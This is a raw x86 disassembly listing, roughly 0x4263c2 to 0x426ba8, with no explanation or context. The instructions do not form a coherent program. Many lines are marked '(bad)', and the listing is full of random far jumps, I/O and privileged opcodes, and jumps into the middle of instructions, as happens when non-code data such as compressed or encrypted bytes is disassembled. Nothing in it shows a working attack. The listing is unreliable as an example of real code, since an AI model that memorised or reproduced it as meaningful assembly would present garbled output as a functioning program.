  4263c2:	mov    esi,0x19a25958
  4263c7:	mov    cl,0x56
  4263c9:	and    DWORD PTR [edx],ebx
  4263cb:	pop    ds
  4263cc:	push   0x84ce5f49
  4263d1:	or     DWORD PTR [esi],ebp
  4263d3:	(bad)  
  4263d4:	mov    ds:0x233e4135,eax
  4263d9:	ret    
  4263da:	icebp  
  4263db:	or     bl,cl
  4263dd:	mov    edx,eax
  4263df:	out    dx,eax
  4263e0:	and    BYTE PTR [ecx-0x10],ah
  4263e3:	xchg   ebp,eax
  4263e4:	les    esi,FWORD PTR [edi+0x4d]
  4263e7:	lods   eax,DWORD PTR ds:[esi]
  4263e8:	mov    bl,0x85
  4263ea:	or     esi,DWORD PTR [edi]
  4263ec:	lods   eax,DWORD PTR ds:[esi]
  4263ed:	xor    esi,DWORD PTR [edx+0x67]
  4263f0:	fwait
  4263f1:	sub    al,0xc2
  4263f3:	nop
  4263f4:	dec    ebp
  4263f5:	push   ds
  4263f6:	lods   al,BYTE PTR ds:[esi]
  4263f7:	std    
  4263f8:	jae    0x4263e4
  4263fa:	push   esi
  4263fb:	jecxz  0x426419
  4263fd:	mov    bh,0x86
  4263ff:	push   es
  426400:	add    ah,BYTE PTR [ebp+0x6a]
  426403:	pushf  
  426404:	loop   0x4263eb
  426406:	jp     0x4263a6
  426408:	jo     0x426397
  42640a:	jmp    0x284d8b9b
  42640f:	xor    al,0x6c
  426411:	mov    dh,0xfc
  426413:	dec    edi
  426414:	out    0x60,eax
  426416:	or     ah,cl
  426418:	adc    al,0xe4
  42641a:	sbb    DWORD PTR [ecx-0x51],edx
  42641d:	jo     0x426471
  42641f:	nop    DWORD PTR [ebx-0x64]
  426423:	aam    0x9b
  426425:	push   edi
  426426:	mov    bl,0xd2
  426428:	scas   eax,DWORD PTR es:[edi]
  426429:	mov    eax,ds:0xb8112209
  42642e:	ret    
  42642f:	sub    BYTE PTR [esi],0xbf
  426432:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426433:	les    esi,FWORD PTR [eiz*8-0x6cfd57ee]
  42643a:	cmc    
  42643b:	in     al,dx
  42643c:	adc    ecx,DWORD PTR [ebx]
  42643e:	jne    0x426483
  426440:	(bad)  
  426443:	aas    
  426444:	pop    ds
  426445:	lock and ebp,DWORD PTR [esi]
  426448:	sbb    al,0x5
  42644a:	mov    eax,0x7fc1f2ec
  42644f:	(bad)  
  426450:	pop    esp
  426451:	jo     0x4264ae
  426453:	iret   
  426454:	sbb    dl,0x16
  426457:	out    dx,eax
  426458:	cmp    eax,DWORD PTR [edi]
  42645a:	fisub  WORD PTR ds:0xf6968b20
  426460:	push   0x513b6f91
  426465:	(bad)  
  426467:	cmc    
  426468:	fsub   DWORD PTR [ebx+0x65]
  42646b:	daa    
  42646c:	adc    DWORD PTR [ecx+0x5e],eax
  42646f:	push   es
  426470:	int    0x72
  426472:	and    eax,0xadcd73f5
  426477:	add    dh,BYTE PTR [edx+0x93518e3]
  42647d:	jae    0x426420
  42647f:	ja     0x4264e0
  426481:	es test al,0x2b
  426484:	rcl    BYTE PTR [eax+0x1a],1
  426487:	aam    0x3
  426489:	sbb    bh,BYTE PTR [edx-0x75]
  42648c:	cmp    eax,0x73643fcc
  426491:	mov    eax,0xc8f26fa5
  426496:	inc    ebx
  426497:	and    esi,ebx
  426499:	outs   dx,BYTE PTR ds:[esi]
  42649a:	pop    edi
  42649b:	inc    ebp
  42649c:	jae    0x426425
  42649e:	jg     0x4264a7
  4264a0:	and    DWORD PTR [edx-0x3a],0xffffffe1
  4264a4:	fldcw  WORD PTR [edx-0x4f550e6b]
  4264aa:	jne    0x4264dc
  4264ac:	jp     0x42646a
  4264ae:	ss dec esi
  4264b0:	cmc    
  4264b1:	and    cl,al
  4264b3:	inc    eax
  4264b4:	xor    BYTE PTR [ebx-0x2f],0xd8
  4264b8:	repnz cli 
  4264ba:	pop    ecx
  4264bb:	rcl    DWORD PTR [eax-0x13],cl
  4264be:	sub    DWORD PTR [ebx+0x18ec180d],edx
  4264c4:	push   edi
  4264c5:	loopne 0x4264b2
  4264c7:	repnz xchg ecx,eax
  4264c9:	addr16 cs inc eax
  4264cc:	dec    esp
  4264cd:	sub    esp,DWORD PTR [esi-0x33f649a]
  4264d3:	xor    BYTE PTR [ebx+0x42],dh
  4264d6:	cmp    edi,DWORD PTR [ecx-0x49]
  4264d9:	(bad)  
  4264db:	out    0xa4,al
  4264dd:	fs jne 0x42649d
  4264e0:	test   BYTE PTR [edx],dl
  4264e2:	and    al,0x9c
  4264e4:	dec    edx
  4264e5:	add    BYTE PTR [eax],al
  4264e7:	add    BYTE PTR [eax],al
  4264e9:	add    BYTE PTR [ecx+0x55],cl
  4264ec:	inc    edx
  4264ed:	push   ebx
  4264ee:	pop    esi
  4264ef:	push   edi
  4264f0:	pop    ecx
  4264f1:	pop    edi
  4264f2:	ss cmc 
  4264f4:	imul   BYTE PTR [ebx]
  4264f6:	cs sub ebx,esi
  4264f9:	popa   
  4264fa:	xchg   dl,dh
  4264fc:	add    DWORD PTR [eax],eax
  4264fe:	add    DWORD PTR [esi],0x0
  426501:	add    BYTE PTR [ebx-0x47ed2141],bh
  426507:	xor    BYTE PTR [ebx+ebx*8+0x44],cl
  42650b:	sbb    dl,dh
  42650d:	sbb    dl,ch
  42650f:	add    eax,0x6a9b59d4
  426514:	(bad)  
  426515:	or     DWORD PTR [ecx+ecx*4-0x72],edx
  426519:	idiv   BYTE PTR [edi+0x5e]
  42651c:	add    eax,0x589fa222
  426521:	mov    ch,BYTE PTR [edi]
  426523:	lods   eax,DWORD PTR ds:[esi]
  426524:	mov    esp,DWORD PTR [edi-0x52de540]
  42652a:	cdq    
  42652b:	sar    ah,0xba
  42652e:	pop    edx
  42652f:	fnstsw WORD PTR [ebp-0x5]
  426532:	fnstsw WORD PTR [ebx+ebp*1+0x1abd8bda]
  426539:	jl     0x426520
  42653b:	pop    ss
  42653c:	daa    
  42653d:	(bad)  [ebp+0x6197eb27]
  426543:	mov    eax,ds:0x6542cf93
  426548:	jns    0x426504
  42654a:	retf   
  42654b:	in     al,0x21
  42654d:	and    cl,BYTE PTR [edx-0x71b89fe1]
  426553:	jecxz  0x426505
  426555:	sub    al,BYTE PTR [edx+0x41]
  426558:	pop    esi
  426559:	scas   al,BYTE PTR es:[edi]
  42655a:	daa    
  42655b:	mov    ecx,0xa612d6e8
  426560:	aam    0xb8
  426562:	inc    esp
  426563:	sbb    BYTE PTR [ebx-0x30],bh
  426566:	test   BYTE PTR [edx-0x61],al
  426569:	fstp   DWORD PTR [ebp+0x7f]
  42656c:	mov    al,0xf2
  42656e:	cmp    ebx,DWORD PTR [edx+0xde28b49]
  426574:	imul   edi,DWORD PTR [ecx+0x10b7260a],0xa4043dd5
  42657e:	or     edi,DWORD PTR [edi-0x7b]
  426581:	repz cmp edi,ecx
  426584:	retf   0xf0a9
  426587:	sbb    dl,BYTE PTR [ebp+0x3f841152]
  42658d:	push   esi
  42658e:	and    ah,BYTE PTR [ebx+0x1132b21f]
  426594:	ins    DWORD PTR es:[edi],dx
  426595:	(bad)  
  426596:	push   0xfc8f3972
  42659b:	mov    ch,BYTE PTR [edi+0x5e95bf18]
  4265a1:	xchg   esp,eax
  4265a2:	jle    0x42659b
  4265a4:	lahf   
  4265a5:	lea    eax,[ecx]
  4265a7:	adc    BYTE PTR [eax+0x6],dl
  4265aa:	lods   al,BYTE PTR ds:[esi]
  4265ab:	push   ecx
  4265ac:	stc    
  4265ad:	xor    dl,ah
  4265af:	mov    ah,0x69
  4265b1:	mov    DWORD PTR [edx+0x391b51f2],edi
  4265b7:	fild   DWORD PTR [eax+0x20421bec]
  4265bd:	mov    ecx,0x337ed7c5
  4265c2:	lahf   
  4265c3:	enter  0x358c,0x43
  4265c7:	push   ss
  4265c8:	mov    DWORD PTR [ebx+0x3c],ebp
  4265cb:	xchg   edx,eax
  4265cc:	xchg   DWORD PTR [esi+0x72],esi
  4265cf:	add    DWORD PTR [ecx+edi*2-0x4989c4f4],esp
  4265d6:	lock repnz std 
  4265d9:	and    al,0x50
  4265db:	inc    ebp
  4265dc:	loop   0x426646
  4265de:	popa   
  4265df:	dec    edi
  4265e0:	mov    esp,0x4c60c1d4
  4265e5:	inc    ebx
  4265e6:	push   esi
  4265e7:	jns    0x4265e0
  4265e9:	dec    esp
  4265ea:	sub    DWORD PTR [ecx],edi
  4265ec:	mov    dh,0x13
  4265ee:	inc    esi
  4265ef:	or     ecx,DWORD PTR [edx-0x2f5201fb]
  4265f5:	mov    ch,0x39
  4265f7:	aam    0x69
  4265f9:	or     DWORD PTR [edi-0x63],0xffffff9c
  4265fd:	dec    edx
  4265fe:	or     DWORD PTR [edx-0x31495a30],esi
  426604:	mov    ds:0xb1b8b80b,al
  426609:	mov    cl,0x8b
  42660b:	add    ah,dh
  42660d:	dec    ebx
  42660e:	test   BYTE PTR [eax],ah
  426610:	cli    
  426611:	xor    bh,0xd9
  426614:	nop
  426615:	push   esi
  426616:	fstp   QWORD PTR [edx+0x565df58b]
  42661c:	pusha  
  42661d:	jmp    0x9686:0xb20b2aa
  426624:	mov    eax,0xe1bf9c12
  426629:	sub    eax,0x7ba3ebbc
  42662e:	dec    esp
  42662f:	out    dx,eax
  426630:	and    BYTE PTR [esi+0x2a3c41a5],dh
  426636:	mov    ds:0x5970081b,al
  42663b:	add    al,0x52
  42663d:	mov    dl,0x6e
  42663f:	jns    0x426631
  426641:	or     eax,0xe7636392
  426646:	sub    DWORD PTR [esi+0x114dcf92],ebx
  42664c:	or     eax,edx
  42664e:	out    dx,al
  42664f:	and    BYTE PTR [esi+edi*4-0x2630435a],dh
  426656:	add    edx,eax
  426658:	push   ebp
  426659:	sbb    ah,ch
  42665b:	pop    esp
  42665c:	jmp    0x5c6cedb9
  426661:	lahf   
  426662:	sahf   
  426663:	test   BYTE PTR [eax],0xa7
  426666:	stos   DWORD PTR es:[edi],eax
  426667:	push   edx
  426668:	outs   dx,DWORD PTR ds:[esi]
  426669:	jecxz  0x42662b
  42666b:	into   
  42666c:	pop    ebp
  42666d:	jno    0x42665d
  42666f:	nop
  426670:	call   0x187e:0x213aea5a
  426677:	jns    0x426699
  426679:	imul   esp
  42667b:	mov    fs:0xf15be256,eax
  426681:	stos   DWORD PTR es:[edi],eax
  426682:	out    0x45,eax
  426684:	mov    cl,0x85
  426686:	outs   dx,BYTE PTR ds:[esi]
  426687:	inc    esi
  426688:	pushf  
  426689:	xchg   ecx,eax
  42668a:	cmp    BYTE PTR [edx-0xa914887],cl
  426690:	test   al,0xad
  426692:	dec    ecx
  426693:	mov    ebp,0x92cbc592
  426698:	xor    ecx,ebx
  42669a:	int    0x7a
  42669c:	xor    BYTE PTR [ebx+0x3c582df8],al
  4266a2:	add    eax,0xf49bef10
  4266a7:	push   es
  4266a8:	scas   al,BYTE PTR es:[edi]
  4266a9:	jbe    0x4266cc
  4266ab:	sub    eax,0x2dadf326
  4266b0:	or     BYTE PTR [ecx+0x5488bebc],dh
  4266b6:	sahf   
  4266b7:	mov    eax,es
  4266b9:	mov    BYTE PTR [eax-0x1f015cd8],al
  4266bf:	aas    
  4266c0:	and    edx,edx
  4266c2:	std    
  4266c3:	xor    al,0xd
  4266c5:	adc    eax,0xc610dc31
  4266ca:	jnp    0x42664e
  4266cc:	(bad)  
  4266cd:	cmc    
  4266ce:	cwde   
  4266cf:	jmp    0x42669d
  4266d1:	pushf  
  4266d2:	mov    ebx,0x7c45ef35
  4266d7:	sahf   
  4266d8:	cmp    DWORD PTR es:[esi-0x3b13c947],ebx
  4266df:	ss mov ecx,0x2c8c6e4
  4266e5:	xor    bl,dl
  4266e7:	pop    esp
  4266e8:	push   ebx
  4266e9:	icebp  
  4266ea:	dec    ebx
  4266eb:	jae    0x426676
  4266ed:	mov    dl,0xdc
  4266ef:	push   0x39233629
  4266f4:	inc    ebx
  4266f5:	inc    eax
  4266f6:	cmp    eax,0x5e7d0d77
  4266fb:	ret    
  4266fc:	mov    ch,0x36
  4266fe:	dec    edi
  4266ff:	pop    ecx
  426700:	sbb    al,0xe9
  426702:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426703:	dec    esi
  426704:	pop    ss
  426705:	sub    DWORD PTR [ebp+0x4772dfcb],ebx
  42670b:	stos   BYTE PTR es:[edi],al
  42670c:	add    eax,0x40c64c4d
  426711:	pop    esp
  426712:	(bad)  
  426713:	scas   al,BYTE PTR es:[edi]
  426714:	mov    ch,0xb3
  426716:	or     ah,BYTE PTR [eax+0x71cd611b]
  42671c:	jecxz  0x4266c8
  42671e:	cmp    DWORD PTR [ebx-0x2a533852],ecx
  426724:	pop    ss
  426725:	sub    ebp,DWORD PTR [edx+0x5633d93b]
  42672b:	xlat   BYTE PTR ds:[ebx]
  42672c:	jbe    0x4266d9
  42672e:	nop
  42672f:	mov    ebx,0x62488de4
  426734:	xchg   BYTE PTR [edi+0x2cc57fb6],dh
  42673a:	add    al,0xad
  42673c:	dec    edx
  42673d:	dec    esi
  42673e:	jmp    0x426766
  426740:	cmp    eax,0x7b88d558
  426745:	cmp    eax,0xf276df1a
  42674a:	rol    cl,1
  42674c:	imul   esi,edi,0xffffff92
  42674f:	mov    ds:0x6a8f3889,eax
  426754:	xor    dl,ah
  426756:	das    
  426757:	mov    WORD PTR [ebx+0x2ba0b104],cs
  42675d:	fcom   DWORD PTR [edi-0x80]
  426760:	mov    ecx,0x358eb96e
  426765:	add    bh,BYTE PTR [esi]
  426767:	xor    sp,WORD PTR [ebx+0xf]
  42676b:	pop    edx
  42676c:	jp     0x426710
  42676e:	cs jmp 0xacabb21e
  426774:	pusha  
  426775:	cmp    esp,esp
  426777:	arpl   WORD PTR [edx+0x6cc9d53],bp
  42677d:	pop    edx
  42677e:	lods   al,BYTE PTR ds:[esi]
  42677f:	mov    eax,0x6a322e66
  426784:	add    BYTE PTR [eax],bl
  426786:	xor    DWORD PTR [esp+ebp*1+0xf3cefb5],edi
  42678d:	mov    dh,0x43
  42678f:	jl     0x426797
  426791:	mov    BYTE PTR [ecx-0x61],al
  426794:	ror    BYTE PTR [edx*4+0x1ac9e987],0xf2
  42679c:	nop
  42679d:	mov    al,ds:0xe1b8a1d0
  4267a2:	mov    BYTE PTR [esi+0x73],0x26
  4267a6:	mov    edi,0xcb6caa77
  4267ab:	je     0x42676f
  4267ad:	cmp    ah,BYTE PTR [ebx]
  4267af:	mov    ?,WORD PTR [esi+0x1f]
  4267b2:	pop    ss
  4267b3:	jge    0x4267c6
  4267b5:	adc    DWORD PTR [esp+edx*8-0x6d],0x2bc7818b
  4267bd:	pop    edi
  4267be:	jge    0x426743
  4267c0:	test   eax,0xd32a971
  4267c5:	pop    ecx
  4267c6:	sub    dl,BYTE PTR [eax+0x13fe100d]
  4267cc:	pusha  
  4267cd:	stc    
  4267ce:	cmp    cl,BYTE PTR [esp+esi*1+0x590e620a]
  4267d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4267d6:	or     dh,BYTE PTR [eax+0x46]
  4267d9:	inc    eax
  4267da:	enter  0x9e33,0xf5
  4267de:	aaa    
  4267df:	xor    BYTE PTR [eax+ebp*2-0x31],bh
  4267e3:	inc    ebx
  4267e4:	cmc    
  4267e5:	loopne 0x4267dc
  4267e7:	sub    BYTE PTR [ebp+ebp*1-0x35792226],ch
  4267ee:	rcr    bl,0x1e
  4267f1:	mov    ss,WORD PTR [ecx-0x36]
  4267f4:	or     eax,0x63160d13
  4267f9:	leave  
  4267fa:	das    
  4267fb:	sbb    bh,BYTE PTR [ebx]
  4267fd:	push   es
  4267fe:	mov    ch,0x47
  426800:	shr    BYTE PTR [esi+0x68f1705d],0x93
  426807:	rcr    DWORD PTR [eax],0x2b
  42680a:	rol    ebp,cl
  42680c:	inc    ecx
  42680d:	xchg   edx,eax
  42680e:	ss pusha 
  426810:	inc    ecx
  426811:	jbe    0x426868
  426813:	jg     0x4267f6
  426815:	jmp    0x4267d2
  426817:	mov    bl,0x77
  426819:	add    al,0x42
  42681b:	jl     0x426882
  42681d:	fnsave [ebx-0x3b]
  426820:	popf   
  426821:	pop    eax
  426822:	shl    DWORD PTR [esi],cl
  426824:	or     ebx,ebp
  426826:	inc    ecx
  426827:	inc    edi
  426828:	add    BYTE PTR [eax],dh
  42682a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42682c:	jle    0x4267d5
  42682e:	loop   0x4267e2
  426830:	pop    esi
  426831:	retf   0x3438
  426834:	and    al,0x77
  426836:	pushf  
  426837:	outs   dx,DWORD PTR ds:[esi]
  426838:	dec    esp
  426839:	push   cs
  42683a:	ss inc edi
  42683c:	jmp    0x42688c
  42683e:	aam    0x83
  426840:	adc    al,0xbe
  426842:	pop    ebx
  426843:	retf   0xce08
  426846:	test   BYTE PTR [edx+eiz*4-0xe],dl
  42684a:	adc    DWORD PTR [edi],ecx
  42684c:	hlt    
  42684d:	test   eax,0xc2c912bc
  426852:	rcr    DWORD PTR [edx],0x2a
  426855:	mov    ebp,ebp
  426857:	add    al,0xe8
  426859:	jb     0x4268d2
  42685b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42685c:	xchg   esi,eax
  42685d:	push   edx
  42685e:	push   esp
  42685f:	inc    esp
  426860:	je     0x4268de
  426862:	add    eax,0x8e270171
  426867:	mov    eax,ds:0xad11838a
  42686c:	ins    BYTE PTR es:[edi],dx
  42686d:	mov    bl,0x4b
  42686f:	adc    cl,BYTE PTR [ecx+0x3eeed9e6]
  426875:	push   edx
  426876:	ret    
  426877:	fisttp DWORD PTR [ecx-0x5489bc87]
  42687d:	ins    BYTE PTR es:[edi],dx
  42687e:	stc    
  42687f:	mov    ecx,0xdc692ea8
  426884:	jno    0x42681b
  426886:	hlt    
  426887:	mov    BYTE PTR [edx+0x53e403eb],dh
  42688d:	mov    bh,0x8b
  42688f:	rcr    DWORD PTR [ecx+ebx*4],0x58
  426893:	push   ebx
  426894:	pop    ds
  426895:	test   esi,edi
  426897:	push   0x4628e83b
  42689c:	scas   eax,DWORD PTR es:[edi]
  42689d:	adc    eax,0x71fee29
  4268a2:	jp     0x4268b2
  4268a4:	sub    DWORD PTR [ebx],edx
  4268a6:	mov    al,0x2c
  4268a8:	fbld   TBYTE PTR [ebp+ebx*4+0x1e]
  4268ac:	fxtract 
  4268ae:	pop    ebp
  4268af:	jb     0x4268eb
  4268b1:	enter  0xc9ef,0xa8
  4268b5:	xor    BYTE PTR [esp+esi*8-0x6c],0xd4
  4268ba:	inc    edi
  4268bb:	retf   
  4268bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4268bd:	xchg   ecx,eax
  4268be:	or     eax,DWORD PTR [ebp+0x59e6ed9b]
  4268c4:	js     0x4268cf
  4268c6:	mov    ebx,0x56e5cc61
  4268cb:	clc    
  4268cc:	mov    bl,0x79
  4268ce:	imul   edx,DWORD PTR [eax-0x423e5ed6],0x27
  4268d5:	jmp    0xfd08:0x331bc3ae
  4268dc:	xor    al,0x2f
  4268de:	cmp    al,0x66
  4268e0:	xor    dh,BYTE PTR ds:0xe6afb5bb
  4268e6:	stos   BYTE PTR es:[edi],al
  4268e7:	into   
  4268e8:	retf   
  4268e9:	mov    WORD PTR [eax],ss
  4268eb:	(bad)  
  4268ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268ed:	jl     0x4268e5
  4268ef:	inc    ebx
  4268f0:	arpl   WORD PTR cs:[ebp+0x8],cx
  4268f4:	xchg   edx,eax
  4268f5:	jnp    0x4268cf
  4268f7:	jmp    0xc3ba:0xbbdccb2c
  4268fe:	neg    BYTE PTR [esi]
  426900:	mov    ds:0x3c6f1e79,al
  426905:	xchg   ebp,eax
  426906:	shr    BYTE PTR [edx],0x93
  426909:	outs   dx,DWORD PTR ds:[esi]
  42690a:	xchg   ebx,eax
  42690b:	jnp    0x426904
  42690d:	es jp  0x4268ad
  426910:	push   ebp
  426911:	es stos DWORD PTR es:[edi],eax
  426913:	push   cs
  426914:	inc    edi
  426915:	push   ds
  426916:	mov    edx,ecx
  426918:	pop    edx
  426919:	xor    eax,0xe014caa4
  42691e:	and    DWORD PTR [esi],esp
  426920:	and    DWORD PTR [esi+0x15],edx
  426923:	jle    0x426960
  426925:	mov    ah,0x29
  426927:	imul   ecx,edi,0xffffffa2
  42692a:	(bad)  
  42692c:	mov    bl,BYTE PTR [edi+0x143dbe4a]
  426932:	mov    ebx,0xc0055060
  426937:	xor    BYTE PTR [esi-0x1],0x10
  42693b:	add    DWORD PTR [esi-0x5a7b5495],ebx
  426941:	push   ecx
  426942:	sahf   
  426943:	xor    eax,0x6d561eaf
  426948:	xchg   esi,eax
  426949:	fs sub al,0xcd
  42694c:	test   eax,0xeb3f95e1
  426951:	inc    ebp
  426952:	mov    fs,WORD PTR [eax-0x57]
  426955:	and    DWORD PTR [ebp-0x62],esp
  426958:	or     ah,BYTE PTR ds:0x48ab873b
  42695e:	lods   eax,DWORD PTR ds:[esi]
  42695f:	inc    esi
  426960:	rcl    BYTE PTR [edx+0x3b],cl
  426963:	adc    ebp,DWORD PTR [esi-0x26]
  426966:	mov    edx,0x8122c99e
  42696b:	jae    0x426999
  42696d:	std    
  42696e:	fwait
  42696f:	scas   al,BYTE PTR es:[edi]
  426970:	lahf   
  426971:	jne    0x426954
  426973:	jl     0x42699e
  426975:	cmp    BYTE PTR [ebx+0x6f],ah
  426978:	jns    0x426942
  42697a:	sub    al,BYTE PTR [ecx+0x64]
  42697d:	pop    ebx
  42697e:	pop    ecx
  42697f:	push   0xffffffee
  426981:	cmp    BYTE PTR [ecx+0x7d],ah
  426984:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426985:	cwde   
  426986:	les    ebp,FWORD PTR [ecx]
  426988:	(bad)  
  426989:	sbb    eax,0xd2d7c5d2
  42698e:	mov    ds:0x69fef2e6,eax
  426993:	les    edi,FWORD PTR [ecx]
  426995:	mov    dl,0xb9
  426997:	inc    ecx
  426998:	popa   
  426999:	xor    ebp,DWORD PTR [ebx-0x56]
  42699c:	imul   eax,edx,0xffffff8e
  42699f:	or     dl,BYTE PTR [esi-0x44168a3c]
  4269a5:	xor    ebx,esp
  4269a7:	outs   dx,BYTE PTR ds:[esi]
  4269a8:	es push ebx
  4269aa:	mov    ss,WORD PTR [ebp-0x56]
  4269ad:	data16 mov WORD PTR [edx],ss
  4269b0:	mov    ?,WORD PTR [esi+0x5b]
  4269b3:	sbb    esp,DWORD PTR [ecx-0x5b0c95fd]
  4269b9:	fisttp DWORD PTR [ecx+0x4515b354]
  4269bf:	sub    al,0x7c
  4269c1:	and    BYTE PTR [ecx-0x12aa7436],al
  4269c7:	clc    
  4269c8:	jecxz  0x4269f3
  4269ca:	cmp    ebx,DWORD PTR [esi+0x6a8a301b]
  4269d0:	pop    ebx
  4269d1:	ss pop edx
  4269d3:	test   al,0xd8
  4269d5:	ss mov cl,0x62
  4269d8:	aaa    
  4269d9:	mov    ds:0x31bbfdae,al
  4269de:	adc    BYTE PTR [ebx-0x4d3aabaf],0x11
  4269e5:	or     ah,BYTE PTR ss:[edi+0x5abea58a]
  4269ec:	sbb    bh,BYTE PTR [ebp-0x43d812dc]
  4269f2:	test   BYTE PTR [ebx+edi*1+0x620ede8f],dl
  4269f9:	sub    dl,bh
  4269fb:	sbb    al,0x51
  4269fd:	mov    ch,0x4c
  4269ff:	mov    ds:0x6ab68543,eax
  426a04:	imul   eax,DWORD PTR [eax+eiz*4-0x3db1a8f3],0xcfa73249
  426a0f:	or     eax,0x49bab172
  426a14:	push   ss
  426a15:	cs in  eax,0x84
  426a18:	jle    0x4269bf
  426a1a:	(bad)  
  426a1c:	mov    ?,WORD PTR [esi-0x684b8446]
  426a22:	test   eax,0x8af6c73b
  426a27:	outs   dx,DWORD PTR ds:[esi]
  426a28:	jle    0x4269e5
  426a2a:	jg     0x4269c9
  426a2c:	cmc    
  426a2d:	test   eax,0x47d8b1be
  426a32:	inc    ebx
  426a33:	outs   dx,BYTE PTR ds:[esi]
  426a34:	je     0x426a4e
  426a36:	sub    edi,DWORD PTR [ebx+0x7a]
  426a39:	sub    DWORD PTR [ecx],esp
  426a3b:	loope  0x426a34
  426a3d:	add    edx,DWORD PTR [ecx-0x20]
  426a40:	pop    es
  426a41:	mov    ebx,0x53225a28
  426a46:	in     al,dx
  426a47:	xor    al,0x77
  426a49:	mov    ebx,0x7c00ace
  426a4e:	mov    edi,0xdd8299a7
  426a53:	pushf  
  426a54:	or     al,0x47
  426a56:	adc    BYTE PTR [esi],dh
  426a58:	in     al,0x86
  426a5a:	sbb    bl,cl
  426a5c:	push   ebp
  426a5d:	lea    ecx,[esi]
  426a5f:	xchg   DWORD PTR [esi+0x3eb2a426],ebp
  426a65:	push   edi
  426a66:	ds and ebx,ecx
  426a69:	pusha  
  426a6a:	test   DWORD PTR ds:0x67cba7a3,edi
  426a70:	imul   ecx,DWORD PTR [eax+0x4ed462ee],0xffffff9b
  426a77:	jge    0x426abb
  426a79:	or     eax,0x8f10160
  426a7e:	jns    0x426add
  426a80:	push   es
  426a81:	test   DWORD PTR [ecx+0x28],0x6124a617
  426a88:	mov    bl,0x5d
  426a8a:	call   0xeb80267d
  426a8f:	or     DWORD PTR [edi-0x4d],ebp
  426a92:	(bad)  
  426a93:	sbb    al,0x2d
  426a95:	fsub   DWORD PTR ds:0xcc488ca0
  426a9b:	mov    dh,0xa0
  426a9d:	sub    DWORD PTR [esi],0x69703aa6
  426aa3:	jecxz  0x426a6a
  426aa5:	lock enter 0x8a83,0xd5
  426aaa:	fidiv  WORD PTR [edi+ebp*8-0x32]
  426aae:	jno    0x426b02
  426ab0:	pusha  
  426ab1:	xchg   ecx,eax
  426ab2:	cwde   
  426ab3:	mov    edx,DWORD PTR [esp]
  426ab6:	call   0x6c28:0xd2148846
  426abd:	jle    0x426aa6
  426abf:	cld    
  426ac0:	pop    esi
  426ac1:	cli    
  426ac2:	adc    cl,BYTE PTR [esi+0x4aee90ea]
  426ac8:	pop    DWORD PTR [esp+eax*4+0x1004903c]
  426acf:	js     0x426b36
  426ad1:	pop    ds
  426ad2:	(bad)  
  426ad3:	or     al,0x23
  426ad5:	jbe    0x426af4
  426ad7:	lods   eax,DWORD PTR ds:[esi]
  426ad8:	xchg   ebp,eax
  426ad9:	mov    eax,ds:0x50f8688e
  426ade:	iret   
  426adf:	add    dl,0x96
  426ae2:	pop    edi
  426ae3:	inc    ecx
  426ae4:	mov    al,0x9
  426ae6:	push   es
  426ae7:	dec    ebp
  426ae8:	ds cmp eax,0x35525e16
  426aee:	ror    esi,cl
  426af0:	(bad)  
  426af1:	retf   0x1135
  426af4:	fdivrp st(2),st
  426af6:	mov    esi,0x5bcaf0b5
  426afb:	inc    ecx
  426afc:	dec    esi
  426afd:	mov    ebx,0x7f1dd5e3
  426b02:	push   eax
  426b03:	aas    
  426b04:	leave  
  426b05:	inc    esi
  426b06:	pop    ecx
  426b07:	inc    esp
  426b08:	(bad)  
  426b09:	(bad)  
  426b0a:	retf   0xab14
  426b0d:	ins    BYTE PTR es:[edi],dx
  426b0e:	add    BYTE PTR [ebp+0x2f5895a6],0xa9
  426b15:	mov    ebx,0x1464ad15
  426b1b:	call   0x51f6:0x27913dd6
  426b22:	pop    edi
  426b23:	outs   dx,BYTE PTR ds:[esi]
  426b24:	xor    DWORD PTR [edi],0x7c
  426b27:	fdiv   DWORD PTR [ecx]
  426b29:	mov    ecx,0x3aaed838
  426b2e:	sub    esp,DWORD PTR [ebx-0x29]
  426b31:	loope  0x426b08
  426b33:	ret    
  426b34:	scas   al,BYTE PTR es:[edi]
  426b35:	dec    ebx
  426b36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426b37:	push   edi
  426b38:	mov    ah,0x41
  426b3a:	(bad)  
  426b3b:	mov    al,0x4d
  426b3d:	iret   
  426b3e:	pop    es
  426b3f:	push   edi
  426b40:	add    BYTE PTR [eax+0x66],dl
  426b43:	mov    esp,0x16069fb8
  426b48:	loop   0x426b1b
  426b4a:	int    0x17
  426b4c:	mov    edi,0x484b3ea
  426b51:	jae    0x426b3f
  426b53:	cmp    ch,BYTE PTR [edx+0x35b69a74]
  426b59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426b5a:	jle    0x426bb6
  426b5c:	shl    BYTE PTR [ecx],1
  426b5e:	adc    edi,DWORD PTR [ebp+0x3d]
  426b61:	sbb    BYTE PTR [edi],0xa3
  426b64:	jecxz  0x426b37
  426b66:	gs scas al,BYTE PTR es:[edi]
  426b68:	adc    DWORD PTR [esi],edx
  426b6a:	sbb    esp,ebp
  426b6c:	mov    edi,0x2b93d4d3
  426b71:	sar    edx,0xf1
  426b74:	inc    edx
  426b75:	imul   eax,DWORD PTR [edi+eiz*2+0x67415e04],0x12
  426b7d:	and    al,0x2f
  426b7f:	lods   al,BYTE PTR ds:[esi]
  426b80:	inc    esi
  426b81:	or     cl,BYTE PTR [ecx]
  426b83:	xchg   esi,eax
  426b84:	inc    eax
  426b85:	add    BYTE PTR [eax],al
  426b87:	add    BYTE PTR [eax],al
  426b89:	add    BYTE PTR [edi+0x56],al
  426b8c:	dec    esp
  426b8d:	inc    edx
  426b8e:	pop    ebp
  426b8f:	pop    edx
  426b90:	dec    edi
  426b91:	push   edi
  426b92:	dec    edx
  426b93:	push   es
  426b94:	enter  0x4d81,0xa5
  426b98:	xor    esi,DWORD PTR [edx]
  426b9a:	or     ecx,edi
  426b9c:	add    DWORD PTR [eax],eax
  426b9e:	add    DWORD PTR [esi],0x0
  426ba1:	add    ch,bl
  426ba3:	mov    esi,0xf3f72e2e
  426ba8:	add    BYTE PTR [esi+0x5f],0x20
